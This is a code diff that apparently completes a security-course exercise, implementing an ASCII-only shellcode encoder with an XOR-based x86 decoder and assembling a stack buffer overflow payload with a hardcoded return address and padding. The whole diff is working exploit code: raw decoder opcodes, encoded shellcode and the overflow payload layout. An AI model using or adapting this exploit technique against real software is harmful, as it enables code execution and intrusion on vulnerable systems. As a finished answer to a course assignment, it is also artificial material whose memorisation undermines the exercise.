@@ -3,6 +3,7 @@ import os
 import socket
 import traceback
 import q2
+import struct 
 
 from infosec.core import assemble, smoke
 from typing import Tuple, Iterable
@@ -53,8 +54,21 @@ def encode(data: bytes) -> Tuple[bytes, Iterable[int]]:
     Returns:
         A tuple of [the encoded data, the indices that need decoding]
     """
-    # TODO: IMPLEMENT THIS FUNCTION
-    raise NotImplementedError()
+    indexes = []
+    new_data = bytearray(data)
+    data_len = len(new_data)
+    mask = 0xff
+    
+    for i in range(data_len):
+    
+        if (new_data[i] <= ASCII_MAX):
+            continue 
+            
+        # Not ASCII.
+        new_data[i] ^= mask
+        indexes.append(i) 
+        
+    return bytes(new_data), indexes
 
 
 @warn_invalid_ascii()
@@ -73,8 +87,12 @@ def get_decoder_code(indices: Iterable[int]) -> bytes:
     Returns:
          The decoder coder (assembled, as bytes)
     """
-    # TODO: IMPLEMENT THIS FUNCTION
-    raise NotImplementedError()
+    decoder = b'\x6a\x00\x5b\x4b' # EBX = 0xFF
+    for index in indices:
+        # XOR BYTE PTR[EAX + index], BL
+        decoder += b'\x30\x58' + struct.pack('c', index.to_bytes(1,'big')) 
+    
+    return decoder
 
 
 @warn_invalid_ascii()
@@ -103,8 +121,16 @@ def get_ascii_shellcode() -> bytes:
          The bytes of the shellcode.
     """
     q2_shellcode = get_raw_shellcode()
-    # TODO: IMPLEMENT THIS FUNCTION
-    raise NotImplementedError()
+    
+    # Init decoder.
+    decoder = b'\x54\x58' # Put ESP at EAX.
+    decoder += b'\x48' * (len(q2_shellcode) + 4) # Decrease eax to the start byte of the shellcode.
+    
+    # Complete decoder.
+    encoded_shell, indices  = encode(q2_shellcode)
+    decoder += get_decoder_code(indices)
+
+    return decoder + encoded_shell
 
 
 @warn_invalid_ascii(lambda payload: payload[4:-5])
@@ -122,8 +148,10 @@ def get_payload() -> bytes:
     Returns:
          The bytes of the payload.
     """
-    # TODO: IMPLEMENT THIS FUNCTION
-    raise NotImplementedError()
+    ra = 0xbfffdd3c
+    message_len = 1040
+    buffuer_len =  1044 
+    return struct.pack('>i', buffuer_len) + get_ascii_shellcode().rjust(message_len, b'\x4A') + struct.pack('<I', ra)
 
 
 def main():
